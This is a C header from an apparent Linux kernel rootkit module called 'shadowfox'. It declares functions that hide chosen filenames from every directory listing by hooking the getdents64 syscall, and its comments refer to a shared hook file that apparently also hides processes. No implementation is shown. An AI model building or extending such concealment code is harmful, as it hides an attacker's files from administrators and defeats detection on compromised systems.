/* SPDX-License-Identifier: GPL-2.0 */
#ifndef _SHADOWFOX_HIDE_FILES_H
#define _SHADOWFOX_HIDE_FILES_H

#include <linux/types.h>

/*
 * Filename concealment from getdents64 enumeration.
 *
 * sf_files_hide(name): add an exact filename to the hidden set.
 * Subsequent getdents64 calls on ANY directory will omit
 * linux_dirent64 entries whose d_name matches.
 *
 * sf_files_show(name): remove a filename from the set.
 * sf_files_clear(): remove all.
 *
 * sf_files_should_hide(name, namelen): query, called by the shared
 * getdents64 hook (hide_proc.c) for each candidate dirent.
 *
 * Matching is exact, case-sensitive. Refuses "." and ".." to keep
 * basic ls semantics intact. Refuses empty names and names longer
 * than NAME_MAX.
 *
 * Locking: the hidden-file list is protected by a spinlock, taken
 * briefly for membership lookups (called from the syscall hook) and
 * for list mutations (called from debugfs handlers).
 *
 * Returns 0 on success or a negative errno.
 */
int sf_files_hide(const char *name);
int sf_files_show(const char *name);
void sf_files_clear(void);

bool sf_files_should_hide(const char *name, int namelen);

#endif /* _SHADOWFOX_HIDE_FILES_H */
